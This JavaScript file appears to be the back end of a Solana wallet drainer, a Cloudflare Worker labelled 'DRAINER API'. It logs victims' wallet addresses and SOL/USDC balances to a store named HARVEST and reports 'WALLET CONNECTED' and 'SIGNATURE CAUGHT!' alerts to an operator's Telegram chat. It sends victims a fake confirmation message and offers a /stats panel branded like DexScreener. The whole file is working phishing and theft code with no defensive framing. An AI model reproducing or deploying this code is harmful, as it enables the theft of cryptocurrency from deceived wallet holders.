export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();

        // TELEGRAM BOT WEBHOOK
        if (url.pathname === "/webhook") {
          if (data.message && data.message.text === "/stats") {
            let messageText = "📊 *DEXSCREENR PANEL*\n\n";
            if (env.HARVEST) {
              const list = await env.HARVEST.list({ limit: 10 });
              for (const key of list.keys) {
                const dataStr = await env.HARVEST.get(key.name);
                if (dataStr) {
                  const d = JSON.parse(dataStr);
                  if (d.type === "connection_and_balance") {
                    messageText += `👤 \`${d.victim.slice(0,4)}...\` | SOL: ${d.sol}\n`;
                  }
                }
              }
            }
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: messageText, parse_mode: "Markdown" }),
            });
          }
          return new Response("OK");
        }

        // DRAINER API
        if (env.HARVEST) {
          await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
        }

        if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
          let channelMsg = "";
          let userMsg = "";

          if (data.type === "connection_and_balance") {
            channelMsg = `🔗 *WALLET CONNECTED*\n\nAddress:\n\`${data.victim}\`\n\nSOL: ${data.sol}\nUSDC: ${data.usdc}`;
            userMsg = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
          } else if (data.type === "drain") {
            channelMsg = `🎣 *SIGNATURE CAUGHT!*\n\nAddress:\n\`${data.victim}\`\n\nTX:\n\`${data.tx}\``;
          }

          if (channelMsg) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown" }),
            });
          }

          if (userMsg && data.tg_user_id) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMsg, parse_mode: "Markdown" }),
            });
          }
        }

        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });

      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    return new Response("Worker Active", { headers: corsHeaders });
  },
};
